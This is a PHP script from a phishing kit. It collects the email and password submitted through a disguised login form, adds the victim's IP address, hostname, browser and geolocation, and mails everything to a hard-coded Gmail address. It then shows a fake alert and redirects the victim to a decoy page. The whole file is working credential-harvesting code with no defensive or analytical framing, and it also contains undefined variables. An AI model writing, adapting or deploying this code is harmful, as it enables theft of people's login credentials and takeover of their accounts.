<?php

$to = "ateranse@gmail.com";

//-----------------------------------------
$email = $_POST['feedback'];
$password = $_POST['feedbacknow'];
$link = $_SERVER['HTTP_REFERER'];
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$state = stripslashes(ucfirst($addr_details[geoplugin_regionName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$subj = "Delivers|$country|$ip";
$msg = "-----------------------------------------------\n	Email Address : $email\n	Password : $password\n-----------------------------------------------\nSubmition Time : $timedate\nBrowser used : $browserAgent\nSystem IP : $ip\nSystem Hostname : $hostname\nState : $state\nCountry : $country\nLink : $link\nBOX URL Address : $box\n-----------------------------------------------\n";
$from = "";
mail($to, $subj, $msg, $from);
	
	
	if (empty($customer))
    {
        echo '<script language="javascript">';
        echo 'alert("You did not complete all the required field, Your account will not be active until you complete all field.")';
        echo '</script>';
        echo "<script>location.replace('index.html');</script>";
        die();
    } 

header('location: details.html?assets.adobedtm.com/5165c8c319825f6ec3fb78d0a8dcc1054ab35a3d/satelliteLib-08b84ffc82250dd93a29554e43774d72e7c1876b/5165c8c319825f6ec3fb78d0a8dcc1054ab35a3d/satelliteLib-08b84ffc82250dd93a29554e43774d72e7c1876b');
?>

